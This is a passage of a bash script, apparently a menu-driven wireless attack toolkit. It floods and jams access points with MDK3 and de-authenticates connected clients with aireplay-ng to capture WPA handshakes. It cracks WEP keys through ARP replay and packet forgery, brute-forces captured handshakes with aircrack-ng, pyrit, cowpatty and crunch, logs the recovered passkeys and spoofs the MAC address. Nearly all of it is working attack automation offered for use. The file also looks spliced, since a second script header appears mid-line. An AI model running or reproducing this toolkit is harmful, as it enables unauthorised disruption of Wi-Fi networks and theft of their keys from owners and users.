   xterm -geometry 95x20+0+500 -e "airodump-ng -c $AP_channel --ignore-negative-one --bssid $AP_bssid mon0" &
   sleep 20
   kill `pidof airodump-ng`
done' > $opt/wifi/temp/MDK3_AP_Reset.sh

      fi

      if [[ $MDK3_ClientChoice == "2" ]]; then

         echo '#!/bin/bash

RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)

AP_bssid=$(cat $opt/wifi/temp/MDK3_APbssid_1.txt)
sleep 1
AP_channel=$(cat $opt/wifi/temp/MDK3_APchannel_1.txt)
echo ""
echo $GREEN"Press Ctrl+c on this screen to terminate the MDK3 attack and continue.$STAND"

   xterm -geometry 100x10+675+0 -e "mdk3 mon0 a -a $AP_bssid -m" &
   xterm -geometry 100x10+675+185 -e "mdk3 mon0 d -b $opt/wifi/temp/Blacklist.txt -c $AP_channel" &
   xterm -geometry 100x10+675+345 -e "mdk3 mon0 b -t $AP_bssid" &
   xterm -geometry 100x10+675+345 -e "mdk3 mon0 m -t $AP_bssid" &

while :
do
   xterm -geometry 95x20+0+500 -e "airodump-ng -c $AP_channel --ignore-negative-one --bssid $AP_bssid mon0" &
   sleep 20
   kill `pidof airodump-ng`
done' > $opt/wifi/temp/MDK3_AP_Reset.sh

      fi
      fi

   if [[ $option == "2" ]]; then

   echo '#!/bin/bash

RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)

AP_bssid=$(cat $opt/wifi/temp/MDK3_APbssid_1.txt)
sleep 1
AP_channel=$(cat $opt/wifi/temp/MDK3_APchannel_1.txt)
echo ""
echo $GREEN"Press Ctrl+c on this screen to terminate the MDK3 attack and continue.$STAND"

   xterm -geometry 100x10+675+0 -e "mdk3 mon0 a -a $AP_bssid -m" &
   xterm -geometry 100x10+675+185 -e "mdk3 mon0 d -b $opt/wifi/temp/Blacklist.txt -c $AP_channel" &
   xterm -geometry 100x10+675+345 -e "mdk3 mon0 b -t $AP_bssid" &

while :
do
   xterm -geometry 95x20+0+500 -e "airodump-ng -c $AP_channel --ignore-negative-one --bssid $AP_bssid mon0" &
   sleep 20
   kill `pidof airodump-ng`
done' > $opt/wifi/temp/MDK3_AP_Reset.sh

   fi

   sleep 1
   chmod +x $opt/wifi/temp/MDK3_AP_Reset.sh
   sleep 1
   Eterm -g 100x10-640-500 --cmod "red" -T "Main Window - Press Ctrl+c to exit MDK3" -e sh -c "$opt/wifi/temp/MDK3_AP_Reset.sh; bash"
   rm $opt/wifi/temp/Blacklist.txt

if [[ $a == "N" || $a == "n" ]]; then
   echo ""
fi
fi
################## END OF: MDK3 ACCESS POINT RESET ############################################

echo "" ;;
0) exit 0;;
*) echo "";
echo "Press [Enter] to continue. . ." ; read ;;
esac

############## End Of Reaver Attacks And Store Recovered Passkey ##############

######################## LOOP ############################################

clear
read -s -n1 -p $RED"Choose another target or return to the main menu:$GREEN
y $BLUE= Choose another target.$GREEN
n $BLUE= Return to main menu.$GREEN
Please choose y/n?$STAND: " CONFIRM
case $CONFIRM in
n|N|NO|no|No)
break ;;
*) echo "" ;;
esac
done

############## End Of Loop Section ##############

############## Start Of Cleanup ##############

rm *.txt
rm *.py
cd
############## End Of Cleanup ##############
;;

###### [4] Capture WPA/WPA2 Handshake ######
4)
cd $opt/wifi/temp
clear
echo $RED"Scan for possible targets."
echo $GREEN"Once you've identified a target press Ctrl-C to exit the scan and to continue."
read -p $GREEN"Press [Enter] to start the scan.$STAND"

xterm -geometry 111x35+650+0 -l -lf WPA_Scan.txt -e airodump-ng --encrypt WPA mon0

tac WPA_Scan.txt | grep 'CIPHER' -m 1 -B 9999 | tac | sed -n '/STATION/q;p' | grep "PSK" | sed -r -e 's/\./ /' | sed '/<length:  0>/d' > temp0.txt
cat temp0.txt | sed 's/^..........................................................................//' | nl -ba -w 1  -s ':  ' | awk '{ print $1, $2 }' | sed 's/^1:/ 1:/' | sed 's/^2:/ 2:/' | sed 's/^3:/ 3:/' | sed 's/^4:/ 4:/' | sed 's/^5:/ 5:/' | sed 's/^6:/ 6:/' | sed 's/^7:/ 7:/' | sed 's/^8:/ 8:/' | sed 's/^9:/ 9:/' > PresentedAPs.txt
sleep 1

PresentedAPs=$(cat PresentedAPs.txt)
sleep 1
echo ""
echo "Please choose an AP"
echo ""
echo "$PresentedAPs"
echo ""
read -p $GREEN"Please input the number of your chosen target:$STAND " Chosen_AP
echo ""

Chosen_AP_Details=$(cat temp0.txt | sed -n ""$Chosen_AP"p")
AP_essid=`echo "$Chosen_AP_Details" | awk '{ print $11 }' | sed 's/^[ \t]*//;s/[ \t]*$//'`
AP_bssid=`echo "$Chosen_AP_Details" | awk '{ print $1 }' | sed 's/^[ \t]*//;s/[ \t]*$//'`
AP_channel=`echo "$Chosen_AP_Details" | awk '{ print $6 }' | sed 's/^[ \t]*//;s/[ \t]*$//'`

clear
echo $RED"Chosen Target Details."$STAND
echo $RED"Aceess Point essid$STAND: $AP_essid"
echo $RED"Aceess Point bssid$STAND: $AP_bssid"
echo $RED"Aceess Point Channel Number$STAND: $AP_channel"

echo ""
echo $RED"Scan for clients connected to$STAND $AP_essid"
echo $RED"Once you have identified the client you wish to target press Ctrl-C to exit"$STAND
read -p $GREEN"Press [Enter] to start the scan."$STAND

xterm -geometry 100x20+650+0 -l -lf WPA_ClientScan.txt -e airodump-ng -c $AP_channel --ignore-negative-one --bssid $AP_bssid mon0

while true
do

tac WPA_ClientScan.txt | grep 'CIPHER' -m 1 -B 9999 | tac | sed -r -e 's/\./ /' | sed '$d' | sed '1,6d' | awk '{ print $2 }' > temp1.txt
cat temp1.txt | nl -ba -w 1  -s ': ' > ConnectedClientsScan.txt
ConnectedClientsScan=$(cat ConnectedClientsScan.txt)

sleep 2
echo ""
echo $RED"Please choose a client MAC address"$STAND
echo ""
echo "$ConnectedClientsScan"
echo ""
read -p $GREEN"Please input the number of your chosen client MAC address:$STAND " Chosen_Client
echo ""

sleep 1
Chosen_Client_MAC=$(cat temp1.txt | sed -n ""$Chosen_Client"p")
echo ""
echo $RED"Chosen Client MAC Address."$STAND
echo "$Chosen_Client_MAC"
echo ""

xterm -geometry 100x20+675+0 -e "airodump-ng -c $AP_channel --ignore-negative-one -w psk --bssid $AP_bssid mon0" &

echo $RED"Choose an option:"
echo $GREEN"[1]$BLUE = De-Authenticate The Chosen Client?."
echo $GREEN"[2]$BLUE = De-Authenticate All Connected Clients?."
echo $GREEN"[3]$BLUE = Choose another client."
echo $GREEN"1, 2, or 3?"$STAND
read option

if [[ $option == "1" ]]; then
       echo "De-Authenticate a single client."
       xterm -geometry 100x20+675+350 -e  "aireplay-ng -0 10 --ignore-negative-one -a $AP_bssid -c $Chosen_Client_MAC mon0"
       fi
if [[ $option == "2" ]]; then
       echo "De-Authenticate all connected clients."
       xterm -geometry 100x20+675+350 -e  "aireplay-ng -0 10 --ignore-negative-one -a $AP_bssid mon0"
       fi
if [[ $option == "3" ]]; then
       clear
echo "Please choose a client"
       echo ""
       echo "$ConnectedClientsScan"
       echo ""
       read -p $GREEN"Please input the number of the chosen client:$STAND " Chosen_Client
       echo ""
       Chosen_Client_MAC=$(cat temp1.txt | sed -n ""$Chosen_Client"p")
       echo ""
       echo "Chosen Target Details."
       echo "$Chosen_Client_MAC"
       sleep 4
       fi

clear
echo -n $GREEN"Re-send de-auth request or choose another client? (y or n)$STAND: "
read -e CONFIRM
case $CONFIRM in
n|N|NO|no|No)
break ;;
*) echo "" ;;
esac
done

rm WPA_Scan.txt
rm temp0.txt
rm PresentedAPs.txt

rm WPA_ClientScan.txt
rm temp1.txt
rm ConnectedClientsScan.txt

kill `pidof airodump-ng`
rm *.csv
rm *.netxml
mv *.cap $opt/wifi/Captured_Handshakes/$AP_essid.cap
cd
;;

###### [5] WEP Attacks ######
5)
cd $opt/wifi/temp
clear
echo $RED"Scan for possible targets."$STAND
echo $GREEN"Once you've identified a target press Ctrl-C to exit the scan and to continue."$STAND
read -p $GREEN"Press [Enter] to start the scan.$STAND"

xterm -geometry 111x35+650+0 -l -lf WEP_Scan.txt -e airodump-ng --encrypt WEP mon0

sleep 1
tac WEP_Scan.txt | grep 'CIPHER' -m 1 -B 9999 | tac | sed -n '/STATION/q;p' | sed '1,2d' | sed '$d' | sed '/<length:  0>/d' > temp0.txt
sleep 1
PresentedAPs=$(cat temp0.txt | awk '{ print $10 }' | nl -ba -w 1  -s ':  ' | sed 's/^[ \t]*//;s/[ \t]*$//' )

clear
echo $RED"Please choose a target"$STAND
echo ""
echo "$PresentedAPs"
echo ""
read -p $GREEN"Please input the number of your chosen target:$STAND " Chosen_AP
echo ""

Chosen_AP_Details=$(cat temp0.txt | sed -n ""$Chosen_AP"p")
AP_essid=`echo "$Chosen_AP_Details" | awk '{ print $10 }' | sed 's/^[ \t]*//;s/[ \t]*$//'`
AP_bssid=`echo "$Chosen_AP_Details" | awk '{ print $1 }' | sed 's/^[ \t]*//;s/[ \t]*$//'`
AP_channel=`echo "$Chosen_AP_Details" | awk '{ print $6 }' | sed 's/^[ \t]*//;s/[ \t]*$//'`

clear
echo $RED"Chosen Target Details."$STAND
echo $RED"Aceess Point essid$STAND: $AP_essid"
echo $RED"Aceess Point bssid$STAND: $AP_bssid"
echo $RED"Aceess Point Channel Number$STAND: $AP_channel"
echo ""
echo $RED"Scan for clients connected to$STAND $AP_essid."
echo $RED"When you've identified a target press Ctrl-C to exit.$STAND"
read -p $GREEN"Press [Enter] to start the scan."$STAND

sleep 1
xterm -geometry 111x35+650+0 -l -lf WEP_ClientScan.txt -e airodump-ng -c $AP_channel --bssid $AP_bssid mon0

echo ""
echo $GREEN"Did the access point have any clients connected to it?. (y/n)$STAND"
read answer

if [[ $answer == "y" || $answer == "Y" ]]; then

       tac WEP_ClientScan.txt | grep 'STATION' -m 1 -B 9999 | tac | awk '{ print $2 }' | sed '1,2d' | sed '$d' > ClientScan.txt
       sleep 2
       PresentedClients=$(cat ClientScan.txt | awk '{ print $1 }' | nl -ba -w 1  -s ':  ' | sed 's/^[ \t]*//;s/[ \t]*$//')
       
       sleep 2
       clear
       echo "Please choose a client"
       echo ""
       echo "$PresentedClients"
       echo ""
       
       read -p $GREEN"Please input the number of your chosen target:$STAND " Chosen_Client
       echo ""

       Chosen_ClientMAC=$(cat ClientScan.txt | sed -n ""$Chosen_Client"p")
       ClientMAC=`echo "$Chosen_AP_Details" | awk '{ print $1 }' | sed 's/^[ \t]*//;s/[ \t]*$//'`

       echo $RED"You've chosen:"
       echo $RED"Client$STAND: $ClientMAC"
       echo ""
       
       while true
       do

       read -p $GREEN"Press [Enter] to start the attack.$STAND"
       xterm -e "airodump-ng -w capture --bssid $AP_bssid -c $AP_channel mon0" &
       xterm -e "sleep 1 && aireplay-ng -1 0 -e $AP_essid -a $AP_bssid -h $ClientMAC --ignore-negative-one mon0" &
       xterm -e "sleep 1 && aireplay-ng -3 -b $AP_bssid -h $ClientMAC --ignore-negative-one mon0" &
       echo $RED"NOTE: There's a 60 second delay before Aircrack-ng starts the cracking process."
       echo "Please wait for aircrack to start...$STAND"
       sleep 60
       aircrack-ng -b $AP_bssid *.cap -l WEPpasskey.txt
       sleep 2
       passkey=$(cat WEPpasskey.txt)
       sleep 2
       kill `pidof xterm`
       echo ""
       echo $RED"Target essid$STAND: $AP_essid"
       echo $RED"Target bssid$STAND: $AP_bssid"
       echo $RED"Target Pass-Key$STAND: $passkey"

       echo -n $GREEN"Was the attack successful? (y or n)$STAND: "
       read -e CONFIRM
       case $CONFIRM in
       y|Y|YES|yes|Yes)
       break ;;
       *) echo $RED"Please re-enter information$STAND" ;;
       esac
       done

       echo AP ESSID: $AP_essid >> $opt/wifi/Recovered-WPA-Passkeys.txt
       echo AP BSSID: $AP_bssid >> $opt/wifi/Recovered-WPA-Passkeys.txt
       echo WEP Passkey: $passkey >> $opt/wifi/Recovered-WPA-Passkeys.txt
       echo ' ' >> $opt/wifi/Recovered-WPA-Passkeys.txt
       cd
       fi
if [[ $answer == "n" || $answer == "N" ]]; then
       while true
       do

       echo $RED"Starting packet capture, press Ctrl+c to end it"$STAND
       xterm -geometry 100x20+675+0 -e "airodump-ng -c $AP_channel --bssid $AP_bssid --ivs -w capture mon0" & AIRODUMPPID=$!
       sleep 2
       aireplay-ng -1 0 -a $AP_bssid -h $mon0mac --ignore-negative-one mon0
       sleep 2
       aireplay-ng -5 -b $AP_bssid -h $mon0mac --ignore-negative-one mon0
       sleep 2
       packetforge-ng -0 -a $AP_bssid -h $mon0mac -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w arp-packet mon0
       sleep 2
       xterm -geometry 100x20+675+100 -e "aireplay-ng -2 -r arp-packet --ignore-negative-one mon0" & AIREPLAYPID=$!
       sleep 2

       echo ""
       echo $GREEN"Attempt to crack the passkey if the data increases, Is the data increasing?. (y/n)$STAND"
       read option
       
       if [[ $option == "y" ]]; then
              aircrack-ng -n 128 -b $AP_bssid *.ivs -l WEPpasskey.txt
              passkey=$(cat WEPpasskey.txt)
              rm WEPpasskey.txt
              kill ${AIRODUMPPID}
              kill ${AIREPLAYPID}
              rm *.ivs
              rm *.cap
              rm *.xor
              rm arp-packet
              echo AP ESSID: $AP_essid >> $opt/wifi/Recovered-WPA-Passkeys.txt
              echo AP BSSID: $AP_bssid >> $opt/wifi/Recovered-WPA-Passkeys.txt
              echo WEP Passkey: $passkey >> $opt/wifi/Recovered-WPA-Passkeys.txt
              echo ' ' >> $opt/wifi/Recovered-WPA-Passkeys.txt
              fi

       echo -n $GREEN"Was the attack successful? (y or n)$STAND: "
       read -e CONFIRM
       case $CONFIRM in
       y|Y|YES|yes|Yes)
       break ;;
       *) echo ""
       esac
       done
       fi
       cd
;;

###### [6] Attack Handshake.cap Files ######
6)
clear
echo $RED"###################################"
echo "#                                 #"
echo "#         With a wordlist         #"
echo "# $GREEN[1]$BLUE = Aircrack-ng               $RED#"
echo "# $GREEN[2]$BLUE = Pyrit                     $RED#"
echo "# $GREEN[3]$BLUE = Pyrit + Cowpatty          $RED#"
echo "#                                 #"
echo "#       Without a wordlist        #"
echo "# $GREEN[4]$BLUE = Crunch + Aircrack-ng      $RED#"
echo "# $GREEN[5]$BLUE = Crunch + Pyrit            $RED#"
echo "# $GREEN[6]$BLUE = Crunch + Pyrit + Cowpatty $RED#"
echo "#                                 #"
echo "###################################"
echo
echo $GREEN"Choose an option?"$STAND
read option
if [[ $option == "1" ]]; then
   clear
   echo $RED
   echo "############################################"
   echo "#                                          #"
   echo "#$STAND   Attack Capture File Using A Wordlist   $RED#"
   echo "#$STAND              (Aircrack-ng)               $RED#"
   echo "#                                          #"
   echo "############################################"
   echo
   echo $RED"eg: /root/Desktop/sky12345.cap"
   read -p $GREEN"Capture file location, name, extension$STAND: " CapNameLocation
   echo
   echo $RED"eg: /root/Desktop/wordlist.txt"
   read -p $GREEN"Wordlist location, name, extension$STAND: " WordlistNameLocation
   clear
   # Chosen user input options
   ############################
   echo
   echo $RED"You've chosen:"
   echo "=============="
   echo $RED"Capture file location, name, extension$STAND: $CapNameLocation"
   echo $RED"Wordlist location, name, extension$STAND: $WordlistNameLocation"
   echo
   echo $RED"Commands to launch:"
   echo "==================="
   echo $STAND"aircrack-ng -w $WordlistNameLocation $CapNameLocation"
   echo
   # Launch chosen commands/options
   #################################
   read -p $GREEN"Press enter to start"$STAND
   clear
   aircrack-ng -w $WordlistNameLocation $CapNameLocation
   fi
if [[ $option == "2" ]]; then
   clear
   echo $RED
   echo "############################################"
   echo "#                                          #"
   echo "#$STAND   Attack Capture File Using A Wordlist   $RED#"
   echo "#$STAND                 (Pyrit)                  $RED#"
   echo "#                                          #"
   echo "############################################"
echo
echo $RED"eg: 00:11:22:33:44:55"
read -p $GREEN"Access Point bssid$STAND: " bssid
echo
echo $RED"eg: /root/Desktop/sky12345.cap"
read -p $GREEN"Capture file location, name, extension$STAND: " CapNameLocation
echo
echo $RED"eg: /root/Desktop/wordlist.txt"
read -p $GREEN"Wordlist location, name, extension$STAND: " WordlistNameLocation
clear
# Chosen user input options
############################
echo
echo $RED"You've chosen:"
echo "=============="
echo $RED"Access Point bssid$STAND: $bssid"
echo $RED"Capture file location, name, extension$STAND: $CapNameLocation"
echo $RED"Wordlist location, name, extension$STAND: $WordlistNameLocation"
echo
echo $RED"Commands to launch:"
echo "==================="
echo $STAND"pyrit -r $CapNameLocation -i $WordlistNameLocation -b $bssid attack_passthrough"
echo
# Launch chosen commands/options
#################################
read -p $GREEN"Press enter to start"$STAND
clear
pyrit -r $CapNameLocation -i $WordlistNameLocation -b $bssid attack_passthrough
                 fi
                 if [[ $option == "3" ]]; then
                                  clear
echo $RED
echo "############################################################################"
echo "#                                                                          #"
echo "#$STAND                   Attack Capture File Using A Wordlist                   $RED#"
echo "#$STAND                            (Pyrit + Cowpatty)                            $RED#"
echo "#                                                                          #"
echo "############################################################################"$STAND
echo
echo $RED"eg: sky12345"
read -p $GREEN"Access Point essid$STAND: " essid
echo
echo $RED"eg: /root/Desktop/sky12345.cap"
read -p $GREEN"Capture file location, name, extension$STAND: " CapNameLocation
echo
echo $RED"eg: /root/Desktop/wordlist.txt"
read -p $GREEN"Wordlist location, name, extension$STAND: " WordlistNameLocation
clear
# Chosen user input options
############################
echo
echo $RED"You've chosen:"
echo "=============="
echo $RED"Access Point essid$STAND: $essid"
echo $RED"Capture file location, name, extension$STAND: $CapNameLocation"
echo $RED"Wordlist location, name, extension$STAND: $WordlistNameLocation"
echo
echo $RED"Commands to launch:"
echo "==================="
echo $STAND"cat $WordlistNameLocation | pyrit -e $essid -i - -o - passthrough | cowpatty -d - -r $CapNameLocation -s $essid"
echo
# Launch chosen commands/options
#################################
read -p $GREEN"Press enter to start"$STAND
clear
cat $WordlistNameLocation | pyrit -e $essid -i - -o - passthrough | cowpatty -d - -r $CapNameLocation -s $essid
                 fi
                 if [[ $option == "4" ]]; then
                                  lear
echo $RED
echo "############################################################################"
echo "#                                                                          #"
echo "#$STAND           Attack a Capture file without using a wordlist file            $RED#"
echo "#$STAND                          (Crunch + Aircrack-ng)                          $RED#"
echo "#                                                                          #"
echo "############################################################################"$STAND
echo
echo $RED"eg: abcdef23456789"
read -p $GREEN"Input the characters, digits, or symbols to be used$STAND: " CharacterSet
echo
echo $RED"eg: 10"
read -p $GREEN"Input the minimum length of the passwords$STAND: " PasswordLengthMin
echo
echo $RED"eg: 10"
read -p $GREEN"Input the maximum length of the passwords$STAND: " PasswordLengthMax
echo
echo $RED"eg:"
echo $RED"-d <Number> = Limits the amount of times a character, digit, or symbol can appear next to its self."
echo $RED"-s XXXXXXXXXX = Start point."
read -p $GREEN"Input any other optional crunch commands?$STAND: " OptionalCrunchOptions
echo
echo $RED"eg: sky12345"
read -p $GREEN"Access Point essid$STAND: " essid
echo
echo $RED"eg: /root/Desktop/sky12345.cap"
read -p $GREEN"Capture file location, name, extension$STAND: " CapNameLocation
clear
# Chosen user input options
############################
echo
echo $RED"You've chosen:"
echo "=============="
echo $RED"Minimum length password$STAND: $PasswordLengthMin"
echo $RED"Maximum length of password$STAND: $PasswordLengthMax"
echo $RED"Characters, digits, symbols to be used in the passwords$STAND: $CharacterSet"
echo $RED"Other crunch commands?$STAND: $OptionalCrunchOptions"
echo $RED"Capture file location, name, extension$STAND: $CapNameLocation"
echo $RED"essid$STAND: $essid"
echo
echo $RED"Commands to launch:"
echo "==================="
echo $STAND"crunch $PasswordLengthMin $PasswordLengthMax $CharacterSet $OptionalCrunchOptions | aircrack-ng $CapNameLocation -e $essid -w -"
echo
# Launch chosen commands/options
#################################
read -p $GREEN"Press enter to start"$STAND
clear
crunch $PasswordLengthMin $PasswordLengthMax $CharacterSet $OptionalCrunchOptions | aircrack-ng $CapNameLocation -e $essid -w -
                 fi
                 if [[ $option == "5" ]]; then
                                  clear
echo $RED
echo "############################################################################"
echo "#                                                                          #"
echo "#$STAND           Attack a Capture file without using a wordlist file            $RED#"
echo "#$STAND                             (Crunch + Pyrit)                             $RED#"
echo "#                                                                          #"
echo "############################################################################"$STAND
echo
echo $RED"eg: abcdef23456789"
read -p $GREEN"Input the characters, digits, or symbols to be used$STAND: " CharacterSet
echo
echo $RED"eg: 10"
read -p $GREEN"Input the minimum length of the passwords$STAND: " PasswordLengthMin
echo
echo $RED"eg: 10"
read -p $GREEN"Input the maximum length of the passwords$STAND: " PasswordLengthMax
echo
echo $RED"eg:"
echo $RED"-d <Number> = Limits the amount of times a character, digit, or symbol can appear next to its self."
echo $RED"-s XXXXXXXXXX = Start point."
read -p $GREEN"Input any other optional crunch commands?$STAND: " OptionalCrunchOptions
echo
echo $RED"eg: sky12345"
read -p $GREEN"Access Point essid$STAND: " essid
echo
echo $RED"eg: /root/Desktop/sky12345.cap"
read -p $GREEN"Capture file location, name, extension$STAND: " CapNameLocation
clear
# Chosen user input options
############################
echo
echo $RED"You've chosen:"
echo "=============="
echo $RED"Minimum length password$STAND: $PasswordLengthMin"
echo $RED"Maximum length of password$STAND: $PasswordLengthMax"
echo $RED"Characters, digits, symbols to be used in the passwords$STAND: $CharacterSet"
echo $RED"Other crunch commands?$STAND: $OptionalCrunchOptions"
echo $RED"Capture file location, name, extension$STAND: $CapNameLocation"
echo $RED"essid$STAND: $essid"
echo
echo $RED"Commands to launch:"
echo "==================="
echo $STAND"crunch $PasswordLengthMin $PasswordLengthMax $CharacterSet $OptionalCrunchOptions | pyrit -e $essid -r $CapNameLocation -i - attack_passthrough"
echo
# Launch chosen commands/options
#################################
read -p $GREEN"Press enter to start"$STAND
clear
crunch $PasswordLengthMin $PasswordLengthMax $CharacterSet $OptionalCrunchOptions | pyrit -e $essid -r $CapNameLocation -i - attack_passthrough
                 fi
                 if [[ $option == "6" ]]; then
                                  clear
echo $RED
echo "############################################################################"
echo "#                                                                          #"
echo "#$STAND           Attack a Capture file without using a wordlist file            $RED#"
echo "#$STAND                       (Crunch + Pyrit + Cowpatty)                        $RED#"
echo "#                                                                          #"
echo "############################################################################"$STAND
echo
echo $RED"eg: abcdef23456789"
read -p $GREEN"Input the characters, digits, or symbols to be used$STAND: " CharacterSet
echo
echo $RED"eg: 10"
read -p $GREEN"Input the minimum length of the passwords$STAND: " PasswordLengthMin
echo
echo $RED"eg: 10"
read -p $GREEN"Input the maximum length of the passwords$STAND: " PasswordLengthMax
echo
echo $RED"eg:"
echo $RED"-d <Number> = Limits the amount of times a character, digit, or symbol can appear next to its self."
echo $RED"-s XXXXXXXXXX = Start point."
read -p $GREEN"Input any other optional crunch commands?$STAND: " OptionalCrunchOptions
echo
echo $RED"eg: sky12345"
read -p $GREEN"Access Point essid$STAND: " essid
echo
echo $RED"eg: /root/Desktop/sky12345.cap"
read -p $GREEN"Capture file location, name, extension$STAND: " CapNameLocation
clear
# Chosen user input options
############################
echo
echo $RED"You've chosen:"
echo "=============="
echo $RED"Minimum length password$STAND: $PasswordLengthMin"
echo $RED"Maximum length of password$STAND: $PasswordLengthMax"
echo $RED"Characters, digits, symbols to be used in the passwords$STAND: $CharacterSet"
echo $RED"Other crunch commands?$STAND: $OptionalCrunchOptions"
echo $RED"Capture file location, name, extension$STAND: $CapNameLocation"
echo $RED"essid$STAND: $essid"
echo
echo $RED"Commands to launch:"
echo "==================="
echo $STAND"crunch $PasswordLengthMin $PasswordLengthMax $CharacterSet $OptionalCrunchOptions | pyrit -e $essid -i - -o - passthrough | cowpatty -d - -r $CapNameLocation -s $essid"
echo
# Launch chosen commands/options
#################################
read -p $GREEN"Press enter to start"$STAND
clear
crunch $PasswordLengthMin $PasswordLengthMax $CharacterSet $OptionalCrunchOptions | pyrit -e $essid -i - -o - passthrough | cowpatty -d - -r $CapNameLocation -s $essid
fi
;;
7)
###########################
# Show Recovered Passkeys #
###########################
gnome-open $opt/wifi/Recovered-WPA-Passkeys.txt
 ;;
8)
##############################################################################
# Check In Recovered-WPA-Passkeys.txt To See If You Already Have The Passkey #
##############################################################################
###################
# Passkey Checker #
###################
clear
echo $RED"How would you like to search."
echo $GREEN"[1]$BLUE = Search using the bssid."
echo $GREEN"[2]$BLUE = Search using the essid."
echo $GREEN"[0]$BLUE = Return To Previous Menu."
echo $GREEN"1, 2 or 0?"$STAND
read option

if [[ $option == "1" ]]; then
while true
do
   echo -n $GREEN"Please input the bssid of the access point you would like to check for?$STAND: "
   read -e SEARCHbssid
   grep -B 1 -A 2 $SEARCHbssid $opt/wifi/Recovered-WPA-Passkeys.txt
   echo
echo -n "Would you like to search again? (y or n): "
read -e CONFIRM
case $CONFIRM in
n|N|NO|no|No)
break ;;
*) echo ""
esac
done
fi
if [[ $option == "2" ]]; then
while true
do
   echo -n $GREEN"Please input the essid of the access point you would like to check for?$STAND: "
   read -e SEARCHessid
   grep -A 3 $SEARCHessid $opt/wifi/Recovered-WPA-Passkeys.txt
   echo
echo -n "Would you like to search again? (y or n): "
read -e CONFIRM
case $CONFIRM in
n|N|NO|no|No)
break ;;
*) echo ""
esac
done
fi
if [[ $option == "0" ]]; then
echo "Returning To Menu"
fi
 ;;
0) exit 0;;
*) echo "You've chosen an invalid option, please choose again";
echo "Press [Enter] to continue. . ." ; read ;;
esac
done#!/bin/bash

 

RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)
BLUE=$(tput setaf 6 && tput bold)

while :
do

###### Create/wifi storage folder if it doeasn't exist ######

if [ -d $opt/wifi ];
then
   echo ""
else
   mkdir $opt/wifi
   mkdir $opt/wifi/temp
   mkdir $opt/wifi/Captured_Handshakes
   mkdir $opt/wifi/Client_Scans
fi

###### Delete Missed Files In The Temp Directory ######

   rm $opt/wifi/temp/*.txt &> /dev/null
   rm $opt/wifi/temp/*.py &> /dev/null
   rm $opt/wifi/temp/*.ivs &> /dev/null
   rm $opt/wifi/temp/*.cap &> /dev/null
   rm $opt/wifi/temp/*.xor &> /dev/null
   rm $opt/wifi/temp/*.csv &> /dev/null
   rm $opt/wifi/temp/*.netxml &> /dev/null
   rm $opt/wifi/temp/arp-packet &> /dev/null
   rm $opt/wifi/temp/*.sh &> /dev/null

###### START OF: DETECT mon0 MAC ADDRESS AND THEN DISPLAY SYSTEM MODE STATUS ######

mon0mac=$(ip addr | grep "radiotap" | cut -c 30-46)

if [ -s $mon0mac ]
then
   MonitorModeStatus=$(echo Networking Mode Enabled)
else
   MonitorModeStatus=$(echo Attack Mode Enabled)
fi

###### System Environment Options Menu ######
clear
echo $RED"#########################################"
echo "#   $STAND         /wifi             $RED#"
echo "#########################################"
echo "#                                       #"
echo "#$GREEN [1]$BLUE WiFi Adapter Selection            $RED#"
echo "#$GREEN [2]$BLUE Enable Attack Or Networking Mode  $RED#"
echo "#$GREEN [3]$BLUE Attack A WPS Enabled Access Point $RED#"
echo "#$GREEN [4]$BLUE Capture WPA/WPA2 Handshake        $RED#"
echo "#$GREEN [5]$BLUE WEP Attacks                       $RED#"
echo "#$GREEN [6]$BLUE Attack Handshake.cap Files        $RED#"
echo "#$GREEN [7]$BLUE Show Recovered Passkeys           $RED#"
echo "#$GREEN [8]$BLUE Recovered Passkey Checker         $RED#"
echo "#                                       #"
echo "#########################################"
echo ""
echo "Chosen Interface$STAND: $wlanX"
echo $RED"System Mode$STAND: $MonitorModeStatus"
echo $RED"MAC address for mon0$STAND: $mon0mac"
echo ""
read -s -n1 -p $GREEN"Please choose an option?$STAND: " ChosenOption
echo 
case $ChosenOption in

1)
###### [1] START OF: CHOOSE A WIFI ADAPTER ######

cd $opt/wifi/temp
clear
Presented_WiFi_Adapters=$(airmon-ng | grep "wlan" | cut -c 1-5 | nl -ba -w 1  -s ": ")
clear
echo $RED"Available WiFi Adapters.$STAND"
echo ""
echo "$Presented_WiFi_Adapters"
echo ""
read -s -n1 -p $GREEN"Please input the number of your chosen WiFi adapter:$STAND " grep_Line_Number
wlanX=$(echo $Presented_WiFi_Adapters | sed -n ""$grep_Line_Number"p" | cut -c 4-8)
echo ""
echo ""
echo $RED"You've chosen:$STAND $wlanX"
sleep 1
cd

;;

###### [1] END OF: CHOOSE A WIFI ADAPTER ######

2)
###### [2] START OF: ENABLE NETWORKING OR ATTACK MODE ######

clear
echo $RED"#########################################"
echo "#                                       #"
echo "# $GREEN[1]$BLUE Enable Networking Mode           $RED #"
echo "# $GREEN[2]$BLUE Enable Attack Mode               $RED #"
echo "# $GREEN[0]$BLUE Return To Main Menu              $RED #"
echo "#                                       #"
echo "#########################################$STAND"
echo ""
read -s -n1 -p $GREEN"Choose an option, 1 or 2?:$STAND " option
if [[ $option == "1" ]]; then
   clear
   echo $RED"Putting the system into networking mode$STAND"
   airmon-ng stop mon5 > /dev/null
   airmon-ng stop mon4 > /dev/null
   airmon-ng stop mon3 > /dev/null
   airmon-ng stop mon2 > /dev/null
   airmon-ng stop mon1 > /dev/null
   airmon-ng stop mon0 > /dev/null
   airmon-ng stop wlanX 
   echo $RED"Please wait...$STAND"
   ifconfig $wlanX down
   ifconfig $wlanX down
   wlanFakeMAC=$(macchanger -r $wlanX | grep "New" | cut -c 16-32)
   ifconfig $wlanX hw ether $wlanFakeMAC
   ifconfig $wlanX up
   sleep 1
   service network-manager start
   echo ""
   echo $RED"Networking mode should now be enabled, A fake MAC address has also been set.$STAND"
   sleep 3
   fi

if [[ $option == "2" ]]; then
   clear
   echo $RED"Putting the system into attack mode$STAND"
   echo $RED"Please wait...$STAND"
   echo ""
   airmon-ng stop mon5 > /dev/null
   airmon-ng stop mon4 > /dev/null
   airmon-ng stop mon3 > /dev/null
   airmon-ng stop mon2 > /dev/null
   airmon-ng stop mon1 > /dev/null
   airmon-ng stop mon0 > /dev/null
   ifconfig $wlanX down

